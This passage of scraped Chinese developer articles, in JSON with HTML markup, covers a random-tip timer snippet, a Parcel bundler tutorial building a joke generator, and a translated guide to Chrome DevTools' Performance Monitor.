class=\"hljs-string\">'提示6'</span>,<span class=\"hljs-string\">'提示7'</span>,<span class=\"hljs-string\">'提示8'</span>,<span class=\"hljs-string\">'提示9'</span>];\nvar tipListShow=[];\ntipListShow=Object.assign([],tipList);\nvar i=0,timer=null;\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">play</span></span>() {\n    //随机显示一个，显示了之后，把这个项从tipListShow中删除掉，防止在同一轮重复出现！\n    console.log(tipListShow.splice(Math.floor(Math.random() * tipListShow.length),1)[0]);\n    //当循环完了之后，tipListShow的长度就会是0，然后就重新赋值，准备进行下一轮的随机循环\n    <span class=\"hljs-keyword\">if</span>(tipListShow.length===0){\n        tipListShow=Object.assign([],tipList);\n        i=0;\n    }\n    //如果需要暂停或者停止的，清除这个定时器即可，下次执行就重新这样创建定时器，执行play();！\n    timer=<span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        play();\n    },500);\n}\nplay();\n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630d77c7225?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"255\" data-height=\"635\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;255&quot; height=&quot;635&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-13\">14.小结</h2><p>好了，关于我收集到的一些业务需求逻辑，以及实现的方式，就说到这里了！接触到的也无需求逻辑很多，但是值得写的，可以当做练习题的，就记录到这里了。我上面代码实现可能会有点粗糙，大家有更好的实现方案，欢迎建议一下。如果大家有什么可以当做练习题的需求，可以提下。让大家有多些练习题可以尝试下，学习下！</p><p><br></p><p><br></p><p>-------------------------华丽的分割线--------------------<br>想了解更多，关注关注我的微信公众号：守候书阁</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d33b27d3f303a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"258\" data-height=\"258\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;258&quot; height=&quot;258&quot;&gt;&lt;/svg&gt;\"></p><p><br></p></div>"},{"title":"从 webpack 到全面拥抱 Parcel #1 探索 Parcel","avatar":"https://user-gold-cdn.xitu.io/2017/12/5/16025f69a17a516c?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"rails365编程学院","create_time":"2017 年 12 月 19 日","tags":["Webpack","JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>最近大家都在关注一个很流行的类似 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.rails365.net%2Fgroups%2Fwebpack\" rel=\"nofollow noopener noreferrer\">webpack</a> 的前端构建工具 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fparcel-bundler%2Fparcel\" rel=\"nofollow noopener noreferrer\">Parcel</a>。这个库刚出来没多久(好像截至目前十几天)，但是很受欢迎，看下图就知道。</p>\n<p></p><figure><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f115943aae?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1067\" data-height=\"205\" src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f115943aae?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<p>所以值得一探！</p>\n<p>官方地址：https://parceljs.org/</p>\n<p>github 地址：https://github.com/parcel-bundler/parcel</p>\n<p>介绍这个库之前，我们来说一下我个人觉得 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.rails365.net%2Fgroups%2Fwebpack\" rel=\"nofollow noopener noreferrer\">webpack</a> 的一些不好的地方（相对于 Parcel）。</p>\n<ol>\n<li>\n<p>需要写配置文件（webpack.config.js），可能每使用一个功能，比如加载图片或 css，都要添加配置，要维护配置文件，而 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fparceljs.org%2F\" rel=\"nofollow noopener noreferrer\">Parcel</a> 不需要。</p>\n</li>\n<li>\n<p>感觉编译或加载速度有些慢，特别是库多或项目复杂的时候，虽然有一些办法代码拆分的方法可以解决，比如 CommonsChunkPlugin 或 DLLPlugin 之类的，但这些方法有些复杂。</p>\n</li>\n</ol>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f11c26ac60?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"532\" data-height=\"268\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;532&quot; height=&quot;268&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<ol start=\"3\">\n<li>需要一定的时间去学习如何使用 webpack。</li>\n</ol>\n<p>而 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fparceljs.org%2F\" rel=\"nofollow noopener noreferrer\">Parcel</a> 有很多优点，可以不使用配置文件，也就是说你只管写代码，它会自动运行，很智能化，打个比方吧，比如在 webpack 中如果要处理 css，那得要安装和加载一个 css 的 loader，然后配置文件写上几行，可是 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fparceljs.org%2F\" rel=\"nofollow noopener noreferrer\">Parcel</a> 不需要，直接用就行。<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fparceljs.org%2F\" rel=\"nofollow noopener noreferrer\">Parcel</a> 学习起来比较简单，基本上可以说 \"不用学习\"，只是使用就可以了。</p>\n<p>除此之外，模块热替换和代码拆分的功能，<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fparceljs.org%2F\" rel=\"nofollow noopener noreferrer\">Parcel</a> 也有，还有，如果要你用 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fparceljs.org%2F\" rel=\"nofollow noopener noreferrer\">Parcel</a> 写一个 react 的运行环境，可能不需要配置任何内容，只要安装几个 react 的包就可以用起来了。</p>\n<p>说了这么多，我还是要把官方对它的特性进行概括的图片放出来：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f11c3a1cbb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"430\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;430&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>下面我们要开始来体验 parcel 的神奇之处，请跟紧。(源码我放到 https://github.com/hfpp2012/hello-parcel）</p>\n<h2 class=\"heading\" data-id=\"heading-0\">1. 安装</h2>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ npm install -g parcel-bundler\n</code></pre><p>然后初始化一个项目。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ mkdir parcelapp\n$ npm init\n</code></pre><h2 class=\"heading\" data-id=\"heading-1\">2. 初体验</h2>\n<p>新建 html 文件。（这个将会是 parcel 的入口文件）</p>\n<p><strong>index.html</strong></p>\n<pre><code class=\"hljs html\" lang=\"html\"><span class=\"hljs-meta\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">\"en\"</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"viewport\"</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">\"width=device-width,initial-scale=1.0\"</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">http-equiv</span>=<span class=\"hljs-string\">\"X-UA-Compatible\"</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">\"ie=edge\"</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Joke Generator<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"wrap\"</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h1</span>&gt;</span>Joke<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h1</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h3</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"joke\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h3</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"copy\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"./index.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span>\n</code></pre><p><strong>index.js</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\">console.log(<span class=\"hljs-string\">'Hello'</span>);\n</code></pre><p>运行编译命令。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ parcel index.html\n</code></pre><p><strong>注意：上面的 parcel 命令接的是 html 文件，它会读 html 文件的内容，找到 javascript 文件，进行自运处理，不用像 webpack 那样，还要指定 javascript 的入口文件啥的。</strong></p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f116495124?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"616\" data-height=\"183\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;616&quot; height=&quot;183&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>生成了 <code>dist</code> 目录。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">dist\n├── index.html\n└── parcelapp.js\n</code></pre><p>监听在 1234 端口，浏览器效果如下：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f11db9a494?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"685\" data-height=\"440\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;685&quot; height=&quot;440&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-2\">3. CommonJS 模块语法</h2>\n<p>新建 jokes.js 文件。</p>\n<p><strong>jokes.js</strong></p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-built_in\">module</span>.exports = {\n  <span class=\"hljs-attr\">getOne</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {\n      <span class=\"hljs-comment\">// 这个 api 是公开的。</span>\n      fetch(<span class=\"hljs-string\">'http://api.icndb.com/jokes/random'</span>)\n        .then(<span class=\"hljs-function\"><span class=\"hljs-params\">res</span> =&gt;</span> res.json())\n        .then(<span class=\"hljs-function\"><span class=\"hljs-params\">data</span> =&gt;</span> {\n          resolve(data.value.joke);\n        })\n    })\n  }\n}\n</code></pre><p><strong>index.js</strong></p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-keyword\">const</span> jokes = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'./jokes'</span>);\n\njokes.getOne()\n  .then(<span class=\"hljs-function\"><span class=\"hljs-params\">joke</span> =&gt;</span> {\n    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">'joke'</span>).innerHTML = joke;\n  });\n</code></pre><p>效果如下：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/19/1606e2f118965045?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"689\" data-height=\"411\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;689&quot; height=&quot;411&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-3\">4. ES6 模块语法</h2>\n<p><code>require</code> 改成 <code>import</code>，如下所示：</p>\n<p><strong>index.js</strong></p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-comment\">// const jokes = require('./jokes');</span>\n\n<span class=\"hljs-keyword\">import</span> { jokes } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./jokes'</span>;\n\njokes.getOne()\n  .then(<span class=\"hljs-function\"><span class=\"hljs-params\">joke</span> =&gt;</span> {\n    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">'joke'</span>).innerHTML = joke;\n  });\n</code></pre><p><strong>jokes.js</strong></p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">const</span> jokes = {\n  <span class=\"hljs-attr\">getOne</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {\n      fetch(<span class=\"hljs-string\">'http://api.icndb.com/jokes/random'</span>)\n        .then(<span class=\"hljs-function\"><span class=\"hljs-params\">res</span> =&gt;</span> res.json())\n        .then(<span class=\"hljs-function\"><span class=\"hljs-params\">data</span> =&gt;</span> {\n          resolve(data.value.joke);\n        })\n    })\n  }\n}\n</code></pre><h2 class=\"heading\" data-id=\"heading-4\">5. 使用 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Faxios%2Faxios\" rel=\"nofollow noopener noreferrer\">axios</a> 代替 fetch</h2>\n<p>这只是为了演示使用一些库。</p>\n<p>首先安装 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Faxios%2Faxios\" rel=\"nofollow noopener noreferrer\">axios</a>。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ npm install axios\n</code></pre><p><strong>注意，这里每安装一个库，都要重新运行 parcel index.html</strong></p>\n<p><strong>jokes.js</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\">import axios from <span class=\"hljs-string\">'axios'</span>;\n\n<span class=\"hljs-built_in\">export</span> const jokes = {\n  getOne: <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>() {\n    <span class=\"hljs-built_in\">return</span> new Promise((resolve, reject) =&gt; {\n      axios.get(<span class=\"hljs-string\">'http://api.icndb.com/jokes/random'</span>)\n        .then(res =&gt; {\n          resolve(res.data.value.joke);\n        })\n    })\n  }\n}\n</code></pre><h2 class=\"heading\" data-id=\"heading-5\">6. 使用 jquery 代替 getElementById</h2>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ npm install jquery\n</code></pre><p><strong>index.js</strong></p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-keyword\">import</span> { jokes } <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./jokes'</span>;\n<span class=\"hljs-keyword\">import</span> $ <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'jquery'</span>;\n\njokes.getOne()\n  .then(<span class=\"hljs-function\"><span class=\"hljs-params\">joke</span> =&gt;</span> {\n    <span class=\"hljs-comment\">// document.getElementById('joke').innerHTML = joke;</span>\n    $(<span class=\"hljs-string\">'#joke'</span>).text(joke);\n  });\n</code></pre><h2 class=\"heading\" data-id=\"heading-6\">7. 导入 非 JavaScript 资源</h2>\n<p><strong>copyright.txt</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\">Copyright 2018\n</code></pre><p><strong>index.js</strong></p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-keyword\">import</span> fs <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'fs'</span>;\n\n...\n\nconst copy = fs.readFileSync(__dirname + <span class=\"hljs-string\">'/copyright.txt'</span>, <span class=\"hljs-string\">'utf8'</span>);\n\n$(<span class=\"hljs-string\">'#copy'</span>).text(copy);\n</code></pre><h2 class=\"heading\" data-id=\"heading-7\">8. 简单处理 css</h2>\n<p><strong>style.css</strong></p>\n<pre><code class=\"hljs css\" lang=\"css\"><span class=\"hljs-selector-tag\">h1</span> {\n  <span class=\"hljs-attribute\">color</span>: red;\n  <span class=\"hljs-attribute\">padding-right</span>: <span class=\"hljs-number\">1rem</span>;\n}\n\n<span class=\"hljs-selector-id\">#wrap</span> {\n  <span class=\"hljs-attribute\">display</span>: flex;\n  <span class=\"hljs-attribute\">justify-content</span>: center;\n  <span class=\"hljs-attribute\">align-content</span>: center;\n  <span class=\"hljs-attribute\">align-items</span>: center;\n  <span class=\"hljs-attribute\">padding</span>: <span class=\"hljs-number\">5px</span>;\n  <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">1px</span> solid <span class=\"hljs-number\">#333</span>;\n  <span class=\"hljs-attribute\">border-radius</span>: <span class=\"hljs-number\">4px</span>;\n  <span class=\"hljs-attribute\">box-shadow</span>: <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">10px</span> <span class=\"hljs-number\">10px</span> <span class=\"hljs-built_in\">rgba</span>(0, 0, 0, 0.12);\n}\n</code></pre><p><strong>index.html</strong></p>\n<pre><code class=\"hljs html\" lang=\"html\"><span class=\"hljs-meta\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">\"en\"</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span>\n  ...\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"style.css\"</span> /&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Joke Generator<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span>\n  ...\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span>\n</code></pre><h2 class=\"heading\" data-id=\"heading-8\">9. 在 css 中使用 import</h2>\n<p><strong>backgrounds.css</strong></p>\n<pre><code class=\"hljs css\" lang=\"css\"><span class=\"hljs-selector-tag\">body</span> {\n  <span class=\"hljs-attribute\">background</span>: <span class=\"hljs-number\">#f4f4f4</span>;\n}\n</code></pre><p><strong>style.css</strong></p>\n<pre><code class=\"hljs css\" lang=\"css\">@<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">'./backgrounds.css'</span>;\n\n...\n</code></pre><h2 class=\"heading\" data-id=\"heading-9\">10. 使用 sass</h2>\n<p>首先，安装 node-sass。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">$ npm install node-sass\n</code></pre><p><strong>这里要花费一定时间，请耐心等待</strong></p>\n<p><strong>backgrounds.scss</strong></p>\n<p><strong>注意：这里由 backgrounds.css 改名为 backgrounds.scss</strong></p>\n<pre><code class=\"hljs css\" lang=\"css\">@<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">'./variables.scss'</span>;\n\n<span class=\"hljs-selector-tag\">body</span> {\n  <span class=\"hljs-attribute\">background</span>: $light-grey;\n}\n</code></pre><p><strong>variables.scss</strong></p>\n<pre><code class=\"hljs css\" lang=\"css\">$light-grey: #f4f4f4;\n</code></pre><p><strong>style.css</strong></p>\n<pre><code class=\"hljs css\" lang=\"css\"><span class=\"hljs-comment\">/* 改名为 scss */</span>\n@<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">'./backgrounds.scss'</span>;\n...\n</code></pre><p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fparceljs.org%2F\" rel=\"nofollow noopener noreferrer\">Parcel</a> 还有很多好玩的，我们以后再说。</p>\n</div>"},{"title":"Chrome DevTools - 性能监控 ","avatar":"https://dn-mhke0kuv.qbox.me/pui5ANRQcNkH6EAaPTAIPuA?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"sunshine小小倩","create_time":"2017 年 12 月 18 日","tags":["前端","掘金翻译计划","Chrome"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote>\n<ul>\n<li>原文地址：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fhospodarets.com%2Fchrome-devtools-performance-monitor%3Futm_source%3DSitePoint%26utm_medium%3Demail%26utm_campaign%3DVersioning\" rel=\"nofollow noopener noreferrer\">Chrome DevTools- Performance monitor</a></li>\n<li>原文作者：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Ftwitter.com%2Fmalyw\" rel=\"nofollow noopener noreferrer\">malyw</a></li>\n<li>译文出自：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner\" rel=\"nofollow noopener noreferrer\">掘金翻译计划</a></li>\n<li>本文永久链接：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%2Fblob%2Fmaster%2FTODO%2Fchrome-devtools-performance-monitor.md\" rel=\"nofollow noopener noreferrer\">github.com/xitu/gold-m…</a></li>\n<li>译者：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fsunshine940326\" rel=\"nofollow noopener noreferrer\">Cherry</a></li>\n<li>校对者：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fyanyixin\" rel=\"nofollow noopener noreferrer\">萌萌</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fnoahziheng\" rel=\"nofollow noopener noreferrer\">noahziheng</a></li>\n</ul>\n</blockquote>\n<h1 class=\"heading\" data-id=\"heading-0\">Chrome DevTools - 性能监控</h1>\n<p>你是否经常需要 JavaScript 或者 CSS 进行优化，但是不能找到一个简单的方式来衡量优化的效果？</p>\n<p>当然，你可以使用时间轴来记录，但是在大多数情况下，时间轴只记录数据，并不是实时更新的。在这点还有其他的性能测量技巧，Chrome DevTools 添加了 “Performance Monitor（性能监控）” 选项卡，可以体现实时性能：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/18/16069939e5ca2b54?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"532\" data-height=\"482\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;532&quot; height=&quot;482&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>这些都是在 Chrom 稳定版本中可用的并且可以进行以下性能监控：</p>\n<ol>\n<li>打开 URL：“chrome://flags/#enable-devtools-experiments”</li>\n<li>将 “Developer Tools experiments” 选项设置为“启用”</li>\n<li>点击 “Relaunch now” 来重启 Chrome</li>\n<li>打开 Chrome DevTools (快捷键为 CMD/CTRL + SHIFT + I)</li>\n<li>打开 DevTools “Setting” -&gt; “Experiments” 选项</li>\n<li>点击 6 次 <code>SHIFT</code> 显示隐藏的选项</li>\n<li>选中 “Performance Monitor” 选项</li>\n<li>重启 DevTools (快捷键 CMD/CTRL + SHIFT + I )</li>\n<li>点击 “Esc” 打开附加面板</li>\n<li>选择 “Performance monitor”</li>\n<li>单击启用/禁用</li>\n<li>开始使用性能监控吧 😀</li>\n</ol>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/18/16069939e9b62c34?imageslim\" data-width=\"800\" data-height=\"580\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;580&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>这里有很多不同的性能选项，大部分都是非常实用的并且我们在 Chrome 中用一些方法进行度量（例如时间轴，性能选项等）。</p>\n<p>但是我想要分享一些新内容：</p>\n<ul>\n<li>“Layouts / sec” 和</li>\n<li>“Style recalcs / sec”</li>\n</ul>\n<p>允许你实时的检测你的 CSS 性能，例如：</p>\n<p>感谢 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fcsstriggers.com%2F\" rel=\"nofollow noopener noreferrer\">csstriggers.com</a>，我们知道，改变 CSS 的 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fcsstriggers.com%2Ftop\" rel=\"nofollow noopener noreferrer\"><code>top</code></a> 和 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fcsstriggers.com%2Fleft\" rel=\"nofollow noopener noreferrer\"><code>left</code></a> 属性会触发整个像素渲染流程：绘制，布局和组合。如果我们将这些属性用于动画，它将每秒触发几十次/上百次操作。</p>\n<p>但是如果你使用 CSS 的 <code>transform</code> 属性的 <code>translateX/Y</code> 来切换动画，你将会发现，<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fcsstriggers.com%2Ftop\" rel=\"nofollow noopener noreferrer\">这并不会触发绘制和布局，仅仅会触发组合这一阶段</a>，因为这是基于 GPU 的，会将你的 CPU 使用率降低为基本为 0%。</p>\n<p>所有的这些都在 Paul Irish 的文章 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.paulirish.com%2F2012%2Fwhy-moving-elements-with-translate-is-better-than-posabs-topleft%2F\" rel=\"nofollow noopener noreferrer\">为什么使用 Translate() 移动元素优于 Top/left</a>。为了测量差异，Paul 使用“时间轴”，展示了触发绘制和布局动作。但是近些年，Paul 正在致力于使用 Chrome DevTools 进行改良，这并不令人惊讶，我们终于有了一个合适的方法来衡量实时 CSS 性能。（我 fork 了他动画切换的示例代码）</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/17/1606485cac9627b6?imageslim\" data-width=\"972\" data-height=\"424\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;972&quot; height=&quot;424&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fcodepen.io%2Fmalyw%2Fpen%2FQOQvyz\" rel=\"nofollow noopener noreferrer\">示例</a></p>\n<p>一般来说，Chrome 中的性能监视器有很多用途。现在，你可以获得实时的应用程序性能数据啦。</p>\n<hr>\n<blockquote>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner\" rel=\"nofollow noopener noreferrer\">掘金翻译计划</a> 